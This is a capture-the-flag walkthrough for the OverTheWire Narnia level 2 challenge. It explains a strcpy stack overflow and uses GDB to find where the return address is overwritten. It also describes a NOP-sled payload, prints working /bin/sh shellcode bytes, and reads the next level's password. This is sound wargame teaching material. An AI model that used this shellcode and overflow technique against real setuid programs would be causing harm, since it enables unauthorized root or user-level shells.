//solving narnia 2

narnia2@narnia:~$ ls
narnia2@narnia:~$ cd /narnia
narnia2@narnia:/narnia$ ls
narnia0    narnia1.c  narnia3    narnia4.c  narnia6    narnia7.c
narnia0.c  narnia2.c  narnia4    narnia5    narnia6.c  narnia8
narnia1    narnia3.c  narnia4.c  narnia5.c  narnia7    narnia8.c
narnia2@narnia:/narnia$ cat narnia2.c

The important part of the code is:

char buf[128];
strcpy(buf, argv[1]);

Here, buf can store only 128 bytes.

strcpy() does not check whether the input is larger than the buffer.

So if we provide more than 128 bytes, the extra data will overwrite the memory after buf on the stack.

narnia2@narnia:/narnia$ ./narnia2
Usage: ./narnia2 argument

The program expects an argument.

narnia2@narnia:/narnia$ ./narnia2 test
test

Now we can test for a buffer overflow:

narnia2@narnia:/narnia$ ./narnia2 $(python3 -c 'print("A"*200)')

The program crashes because our input is overflowing the buffer.

Now we use GDB to find where we can control the return address:

narnia2@narnia:/narnia$ gdb ./narnia2

(gdb) break main
Breakpoint 1 at ...

(gdb) run $(python3 -c 'print("A"*128 + "BBBB" + "CCCC")')

After the crash:

(gdb) info registers

We can see that our input has reached the instruction pointer.

CCCC in hexadecimal is:

C = 0x43

So:

CCCC = 0x43434343

This means that we have control over the saved return address.

The payload structure is:

[padding] + [return address] + [shellcode]

The padding fills the buffer until we reach the saved return address.

The return address tells the program where to continue execution.

We can place shellcode inside the input and overwrite the return address so execution goes to our shellcode.

We can also use a NOP sled:

\x90\x90\x90\x90...

A NOP sled gives us a larger area where execution can land before reaching the shellcode.

The shellcode executes /bin/sh:

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80

After finding the correct offset and return address with GDB, we provide the final payload.

narnia2@narnia:/narnia$ ./narnia2 $(python3 -c 'print(...)')

If the payload is correct, we get a shell:

$

Now check the user:

$ whoami
narnia3

Because narnia2 is a setuid binary, the shell runs with the privileges of narnia3.

Now read the password:

$ cat /etc/narnia_pass/narnia3

<password>

Then we can log into the next level:

$ ssh narnia3@narnia.labs.overthewire.org -p 2226

